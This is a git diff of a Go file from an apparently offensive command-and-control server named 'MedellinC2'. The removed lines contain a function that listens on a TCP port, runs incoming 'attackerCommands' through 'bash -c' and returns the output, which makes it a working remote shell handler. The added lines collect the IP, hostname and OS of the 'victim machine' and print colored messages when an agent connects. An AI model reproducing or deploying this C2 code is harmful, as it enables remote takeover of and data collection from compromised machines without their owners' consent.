@@ -11,7 +11,6 @@ import (
 	"log"
 	"net"
 	"os/exec"
-	"strconv"
 	"strings"
 	"time"
 
@@ -45,64 +44,17 @@ func init() {
 	serverCmd.AddCommand(startCmd)
 }
 
-func handleConnection(c net.Conn) {
-	fmt.Print("Agent successfully connected to MedellinC2 Server\n")
-	for {
-		netData, err := bufio.NewReader(c).ReadString('\n')
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-
-		temp := strings.TrimSpace(string(netData))
-		if temp == "STOP" {
-			break
-		}
-		fmt.Println(temp)
-		counter := strconv.Itoa(count) + "\n"
-		c.Write([]byte(string(counter)))
-	}
-	c.Close()
-}
-
-func handlePorts(port string) {
-	l, err := net.Listen("tcp4", ":"+port)
-
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	defer l.Close()
-
-	for {
-		connection, err := l.Accept()
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
-		go handleConnection(connection)
-		//count++
-		//handle commands
-		for {
-			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
-			cmd := exec.Command("bash", "-c", attackerCommands)
-			if err != nil {
-				log.Fatalln(err)
-			}
-			out, _ := cmd.CombinedOutput()
-
-			connection.Write(out)
-		}
-	}
-
-}
-
 //TESTING
 func handleClientRequest(con net.Conn) {
+	//fancy colors for console output
+	colorGreen := "\033[32m"
+
 	defer con.Close()
 
+	/* On the TCP server (C2), print below message once a TCP Client (agent) has successfully connected */
 	clientReader := bufio.NewReader(con)
-	println("A new agent has successfully connected")
+	fmt.Println(string(colorGreen), "A new agent has successfully connected")
+	getAgentInfo() //get the information such as IP, Hostname, OS of an agent (victim machine)
 	for {
 		// Waiting for the client request
 		clientRequest, err := clientReader.ReadString('\n')
@@ -126,6 +78,7 @@ func handleClientRequest(con net.Conn) {
 
 		// Responding to the client request
 		if _, err = con.Write([]byte("Command succesfully executed. Successfully Connected to MedellinC2! Please Continue interacting with your agent\n")); err != nil {
+			//generateAgent() //If an agent connects then generate an agent
 			log.Printf("failed to respond to client: %v\n", err)
 		}
 
